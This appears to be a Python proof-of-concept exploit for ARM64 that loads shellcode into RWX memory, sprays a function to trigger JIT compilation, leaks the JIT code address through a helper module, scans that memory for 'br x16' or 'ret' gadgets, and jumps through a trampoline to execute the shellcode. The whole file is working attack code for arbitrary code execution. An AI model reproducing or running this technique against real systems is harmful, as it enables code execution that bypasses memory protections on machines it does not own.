import ctypes
import mmap
import struct
import jitexecleak
from capstone import *

# Capstone config
md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)
md.detail = True
raw_gadgets = {
    b"\x00\x02\x1f\xd6": "br x16",
    b"\xc0\x03\x5f\xd6": "ret",
}

# Load shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()
print(f"[+] Loaded shellcode: {len(shellcode)} bytes")

# Allocate RWX memory and write shellcode
libc = ctypes.CDLL("libc.so.6")
libc.mmap.restype = ctypes.c_void_p
sc_addr = libc.mmap(None, 0x1000, 7, 0x22, -1, 0)
ctypes.memmove(sc_addr, shellcode, len(shellcode))
print(f"[+] Shellcode mmap @ 0x{sc_addr:x}")

# Trampoline for setting x16
TRAMP = (
    b"\x10\x00\x00\x58" +  # ldr x16, #8
    b"\x00\x02\x1f\xd6" +  # br x16
    struct.pack("<Q", sc_addr)
)
tramp_buf = ctypes.create_string_buffer(TRAMP)
tramp_addr = ctypes.addressof(tramp_buf)
print(f"[+] Trampoline @ 0x{tramp_addr:x} -> shellcode")

# Spray function
def spray(x):
    acc = x
    for i in range(30000):
        acc ^= (0xF0F0F0F0 & i)
        acc += (acc << 1)
        acc &= 0x0F0F0F0F
    return acc

for _ in range(6000):
    spray(42)

# Leak executor->jit_code
jit_addr = jitexecleak.leak_executor_jit(spray)
print(f"[+] executor->jit_code @ 0x{jit_addr:x}")

# Scan memory for gadget
length = 0x4000
mem = ctypes.string_at(jit_addr, length)
found = False
for i in range(len(mem) - 4):
    chunk = mem[i:i+4]
    if chunk in raw_gadgets:
        gadget_addr = jit_addr + i
        print(f"[GADGET] {raw_gadgets[chunk]} @ 0x{gadget_addr:x}")
        found = True
        break

if not found:
    raise RuntimeError("[-] No gadget found")

# Execute shellcode via gadget
FUNC = ctypes.CFUNCTYPE(None)
fn = FUNC(gadget_addr)
print("[*] Jumping to gadget...")
fn()
